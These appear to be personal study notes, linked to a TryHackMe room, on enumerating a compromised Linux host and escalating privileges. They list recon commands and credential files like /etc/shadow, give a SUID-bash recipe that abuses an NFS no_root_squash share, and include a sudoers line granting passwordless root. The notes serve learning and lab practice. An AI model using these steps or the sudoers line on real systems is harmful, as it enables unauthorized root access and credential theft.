# Compromise a Linux host

Aside from commands that are in the Linux notes, here are a few used in cybersecurity.

<div class="row row-cols-md-2"><div>

* `w`: who is logged in, and what they are doing
* `who`: who is logged in
* `echo $0`: language used by the current shell
* `whoami`: username
* `last`: list of last logged users
* `id`: username, group...
* `groups`: list groups
* `uname -a`: info about the kernel
* `hostname`: info about the host <small>(ex: `website-dev` -> role of the user)</small>
* `ps -e` / `top`: see running process
* `env`: see environment variables
* `umask`: see the default perms on newly created files
* `finger`: return a summary of information about a user
* `find / -writable -type d 2>/dev/null`: find writable directories

**Potentially vulnerable services** 💸

* Apache: `apache2 -v` / `apache2ctl -M`
* Sudo: `sudo -V`
* PostgresSQL: `psql -V`
* MySQL: `mysql --version`
</div><div>

System Files 🔏

* `/proc/version`: information about the machine
* `/etc/*release`: information about the operating system
* `/etc/issue`: an alternative to find the OS/version
* `/etc/passwd`: usernames, their groups, their home, and their shell
* `/etc/shadow` <small>(root)</small>: username, and their hashed password
* `/etc/sudoers` <small>(root)</small>: sudoers, and rules applied to them, if any

Others 🔎

* Port and services: `/etc/services`
* Environment variables: `/etc/profile`

</div></div>

> **NOTE**: don't forget to redirect any errors with `some_command 2> /dev/null`.

<hr class="sep-both">

## Network File System (NFS)

[![kenobi](../../_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)

<div class="row row-cols-md-2"><div>

To avoid copying and pasting information too much, you will have to read these pages for more information.

* [NFS protocol](/_it/networking/protocols/index.md#-nfs---2049-tcp)
* [NFS notes](/_cybersecurity/exploitation/services/index.md#nfs---2049-tcp)

To summarize, locally, you can use this command to find NFS shares.

```bash
# see NFS exports
$ cat /etc/exports
```
</div><div>

You will find an exploitable NFS misconfiguration when the option `no_root_squash` is set for a share. Root squashing map any local user to the user "nobody". If disabled, then the root user on the local machine will have root privilege inside the share.

```bash
# on the remote host, we create a bash inside the share
$ cp /bin/bash /share/sbash
# on the local host
# we give the file root privileges
$ sudo chown root /tmp/share/sbash
$ sudo chmod +s /tmp/share/sbash
# Then on the host, running the SUID file
# will run it as root
$ /share/sbash -p
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-md-2"><div>

Courses

* [payatu.com](https://payatu.com/guide-linux-privilege-escalation)
* [udemy.com](https://www.udemy.com/course/linux-privilege-escalation/)
* `$(whoami)  ALL=(ALL) NOPASSWD:ALL`
</div><div>
</div></div>